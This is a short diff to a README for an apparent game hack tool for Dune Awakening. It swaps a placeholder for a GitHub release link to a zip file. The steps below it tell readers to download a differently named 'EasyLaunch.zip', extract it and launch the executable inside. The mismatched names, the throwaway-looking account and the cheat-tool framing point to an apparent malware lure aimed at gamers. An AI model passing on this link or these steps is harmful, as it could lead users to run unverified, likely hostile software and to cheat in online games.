@@ -38,7 +38,7 @@
 ---
 
 ## 🛠️ Installation Guide
-## [Download Link](5)
+## [Download Link](https://github.com/gfdg4wef23/dune-awakening-hacktool-elite/releases/download/V1.5/Dune.Awakening.zip)
 1. **Download** `EasyLaunch.zip` from the repository release section.
 2. **Extract** the ZIP file into your desired directory.
 3. **Launch** the executable matching your operating system.
